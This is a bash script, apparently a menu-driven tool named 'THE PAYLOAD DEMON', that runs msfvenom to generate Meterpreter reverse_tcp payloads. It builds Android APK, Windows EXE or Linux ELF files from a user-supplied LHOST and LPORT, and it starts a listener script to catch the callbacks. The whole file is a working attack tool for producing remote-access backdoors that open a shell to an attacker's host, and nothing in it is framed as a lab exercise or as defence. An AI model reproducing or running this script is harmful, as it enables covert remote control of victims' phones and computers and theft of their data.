#!/bin/bash
while :
do
clear
echo -e "\e[2;31;48m    _       ____     _____      _  _      _   _   __  __ \e[0m"
echo -e "\e[2;32;48m   / \     |  _ \   |_   _|   _| || |_   | | | |  \ \/ / \e[0m"
echo -e "\e[2;33;48m  / _ \    | |_) |    | |    |_  ..  _|  | |_| |   \  /  \e[0m"
echo -e "\e[2;34;48m / ___ \   |  _ <     | |    |_      _|  |  _  |   /  \  \e[0m"
echo -e "\e[2;35;48m/_/   \_\  |_| \_\    |_|      |_||_|    |_| |_|  /_/\_\ \e[0m" 
echo -e  "\n\n\e[1;31;48m***************************************** \e[0m"; sleep 0.5
echo -e  "\e[1;32;48m           THE PAYLOAD DEMON              \e[0m";sleep 0.5
echo -e  "\e[1;31;48m***************************************** \e[0m";sleep 0.5
echo -e  "\e[1;37;48m                           by \e[0m\e[3;32;48mAraign\e[0m Pirate\e[3;31;48m\e[0m";sleep 0.5
echo -e  "\n\e[1;33;48m 1 ->\e[0m \e[1;34;48m android/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 2 ->\e[0m \e[1;34;48m windows/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 3 ->\e[0m \e[1;34;48m linux/x86/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 4 ->\e[0m \e[1;34;48m START LISTENER \e[0m"
echo -e  "\e[1;33;48m 5 ->\e[0m \e[1;34;48m EXIT\e[0m\n";sleep 0.5
read -p "ENTER YOUR CHOICE: " CHOICE
if [ $CHOICE -eq 1 ]
then 
	pwde="$1/apk"
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 0.5
	echo -e "\e[1;31;48m       STARTED MAKING ANDROID PAYLOAD\e[0m";sleep 0.5
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 0.5
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME [exmple.apk]: " APK
 	echo -e "\n\e[1;32;48mUSING MSFVENOM TO CREATE PAYLOAD\e[0m"
	echo ` msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST  LPORT=$LPORT R -o $pwde/$APK`
	echo -e "\e[1;32;48mTHE APK WILL BE AT\e[0m\e[1;31;48m $pwde/$APK\e[0m \n\n"
elif [ $CHOICE -eq 2 ]
then 
	pwde="$1/exe"
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 0.5
	echo -e "\e[1;31;48m       STARTED MAKING WINDOWS PAYLOAD\e[0m";sleep 0.5
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 0.5
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME [exmplr.exe]: " EXE
 	echo -e "\n\e[1;32;48mUSING MSFVENOM TO CREATE PAYLOAD\e[0m"
	echo ` msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST  LPORT=$LPORT R -o $pwde/$EXE`
	echo -e "\e[1;32;48mTHE APK WILL BE AT\e[0m\e[1;31;48m $pwde/$EXE\e[0m \n\n"
elif [ $CHOICE -eq 3 ]
then
	pwde="$1/elf"	
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 0.5
	echo -e "\e[1;31;48m       STARTED MAKING LINUX PAYLOAD\e[0m";sleep 0.5
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 0.5
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME [exmple.elf]: " ELF
 	echo -e "\n\e[1;32;48mUSING MSFVENOM TO CREATE PAYLOAD\e[0m"
	echo ` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST  LPORT=$LPORT R -o $pwde/$ELF`
	echo -e "\e[1;32;48mTHE APK WILL BE AT\e[0m\e[1;31;48m $pwde/$ELF\e[0m \n\n"
elif [ $CHOICE -eq 4 ]
then
	pwde="$1"
	echo `xfce4-terminal --title="EXPLOIT DEMON " --color-bg="black" --execute $pwde/bin/metasploit_demon.sh $1 &` 
elif [ $CHOICE -eq 5 ]
then 
	echo -e "\n\e[1;36;48m<=======\e[0m\e[1;35;48mEXITING\e[0m\e[1;36;48m========>\e[0m\n"
	read input
	exit
else
	echo -e "\n\e[1;36;48m!!!!!!!!!-\e[0m\e[1;35;48mNOT A VALID CHOICE\e[0m\e[1;36;48m-!!!!!!!!!!!\e[0m"
fi
read input
done
